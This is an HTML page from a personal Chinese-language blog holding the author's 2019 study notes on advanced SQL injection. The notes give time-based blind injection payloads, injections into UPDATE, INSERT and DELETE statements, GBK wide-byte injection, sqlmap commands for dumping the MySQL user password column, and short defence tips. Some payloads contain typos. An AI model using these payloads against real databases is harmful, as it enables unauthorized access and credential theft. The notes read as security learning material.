@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword" content="">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="pengpengp&#39;s BLOG" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        sql_注入进阶｜undefined
+        
+    </title>
+
+    <link rel="canonical" href="https://pengpengp.github.io/2019/01/04/sql-inject-advance/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/blog-style.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+</head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost="true" data-istags="false
+" data-ishome="false">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    pengpengp&#39;s BLOG
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img" src="">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>sql_注入进阶</h1>
+                    
+                    <span class="meta">
+                         作者 pengpengp
+                        <span>
+                          日期 2019-01-04
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#sql_inject" title="sql_inject">sql_inject</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            sql_注入进阶
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <blockquote>
+<p>基于时间延时的盲注</p>
+</blockquote>
+<blockquote>
+<p>一. 基于时间延时的盲注</p>
+</blockquote>
+<p>​        <code>select sleep(5)；等待五秒，返回值是0***</code></p>
+<p>​        <code>select if(arg1,arg2,arg3);判断返回值的真假</code></p>
+<p>​        <code>select benchmark(50000,md5(&#39;abc&#39;))</code>前面是执行次数，后面是执行的命令</p>
+<ul>
+<li>判断第一个字母的方法</li>
+</ul>
+<p>  ​    <code>ASCII(substr(version(),1,1)&gt;50)</code></p>
+<ul>
+<li><p>判断ASCII码对应的值：    </p>
+<p>​    <code>select chr(49);</code></p>
+</li>
+<li><p>例子：</p>
+<p>​    <code>1.select if(length(versioin())&gt;5,sleep(3),1);先判段长度</code></p>
+<p>​    <code>2.select if(ascii substr((version()),1,1))&gt;50,sleep(2),0);再判断每个字母是什么</code></p>
+</li>
+</ul>
+<p>（先测试普通的注入，都不行就开始测试时间延迟盲注）</p>
+<blockquote>
+<p>二. 应用：—-&gt;除了select语句以外，其他的sql语句都有危险性，千万小心！！！    </p>
+</blockquote>
+<ul>
+<li>select（搜索功能）的注入：</li>
+</ul>
+<p>​        <code>select * from books where name like &#39;zs&#39;;</code></p>
+<ul>
+<li><p>update语句注入：</p>
+<ul>
+<li>原句：<code>UPDATE Person SET FirstName = &#39;Fred&#39; WHERE LastName = &#39;Wilson&#39;</code></li>
+<li>构造的语句：<code>update users set pass = &#39;123&#39; where if(length(version())&gt;5,sleep(2),0)#</code></li>
+<li>注意：使用update时一定返回值为0，否则密码全被改掉了！！！</li>
+</ul>
+</li>
+<li><p>insert(插入语句)测注入：</p>
+<ul>
+<li><p>原句：<code>insert into users(id,name,password)value(1,&#39;we&#39;,&#39;123&#39;)</code></p>
+</li>
+<li><p>构造的：<code>1&#39;,1,1)#</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>delete语句：</p>
+<ul>
+<li><p>原句：<code>delete from user where id =5</code></p>
+<p>如果数据够多，可以采用布尔盲注（省时间但是会删除成功）</p>
+<p>如果保留数据，就采用延时盲注（可能会比较浪费时间但不会真删除）</p>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>三. 正确安全的测试注入步骤（不改数据库）：</p>
+</blockquote>
+<p>​    先–&gt;：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and sleep(1) #</span><br><span class="line">123&quot; and sleep(1) #</span><br><span class="line">123&apos;) and sleep(1) #</span><br><span class="line">123&quot;) and sleep(1) #</span><br></pre></td></tr></table></figure>
+<p>​    然后–&gt;：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and id = 100 and sleep(3)#</span><br><span class="line">123&apos; and id = 1 and sleep(3)#</span><br><span class="line">123&apos; and id = 10 and sleep(3)#</span><br><span class="line">123&apos; and id = 11 and sleep(3)#</span><br><span class="line">123&apos; and id = 111 and sleep(3)#</span><br></pre></td></tr></table></figure>
+<p>最后–&gt;：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and id = 1 and if(length(version())&gt;5,sleep(3),0) #</span><br><span class="line"></span><br><span class="line">update users set img = &apos;uploads/1546450026timg3.jpg&apos; where name &apos;qwerdf&apos;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>宽字节注入-GBK编码</p>
+<ul>
+<li><p>原理：</p>
+<p>GBK注入：DF 5c 2字节，利用%df’的方式就可以注入</p>
+<p>utf8 3字节    没有注入</p>
+</li>
+</ul>
+</li>
+<li><p>二次编码注入</p>
+</li>
+</ul>
+<p>​    使用比较少，这里就不总结了</p>
+<blockquote>
+<p>四. 自动扫描sql注入：sqlmap</p>
+</blockquote>
+<p>​    启动：<code>python sqlmap.py --url &#39;http://192.168.11.86/index.php?id=1&#39; 添加注入地址</code></p>
+<p>​    -v参数 1-6可以选择显示的详细程度，报告默认保存在家目录下</p>
+<p>​    常规步骤：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--dbs 列出所有的数据库</span><br><span class="line">-D	库 --tables列出所有的表		</span><br><span class="line">-T	表	--columns列出所有的字段		</span><br><span class="line">-C	字段 --dump获取字段内容	</span><br><span class="line">--dump列出详细信息</span><br></pre></td></tr></table></figure>
+<h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><p>举例：<code>C:\tools\sqlmap-1.2.12&gt;python sqlmap.py --url http://192.168.11.86/index.php?id=1 -D mysql -T user --columns -C password --dump</code></p>
+<ul>
+<li>五.防御sql注入的方法：<ul>
+<li>1.addslashes(string)；可以把字符中的引号加上\进行转义，但是不能防御数字型注入即id=1 and 类型</li>
+<li>2.PDO进行绑定</li>
+<li>3.使用防御软件进行（如Web Application Firewall等）</li>
+</ul>
+</li>
+</ul>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/2018/12/28/sql-inject-Process/" data-toggle="tooltip" data-placement="top" title="'sql_inject_Process'">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+
+                
+
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#"><span class="toc-text"> </span></a></li></ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; pengpengp&#39;s BLOG 2019
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/blog.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://pengpengp.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="">
+</body>
+
+</html>
